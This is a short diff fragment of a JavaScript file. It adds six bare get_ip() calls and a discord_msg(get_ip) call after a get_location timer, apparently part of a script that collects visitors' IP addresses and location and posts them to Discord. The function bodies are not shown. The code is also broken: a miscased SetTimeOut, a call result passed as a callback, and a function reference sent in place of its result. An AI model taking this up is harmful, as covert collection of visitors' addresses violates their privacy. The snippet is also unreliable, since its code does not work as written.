@@ -36,3 +36,11 @@ async function get_location() {
 };
  
 window.SetTimeOut(get_location(), 2000)
+
+get_ip()
+get_ip()
+get_ip()
+get_ip()
+get_ip()
+get_ip()
+discord_msg(get_ip)
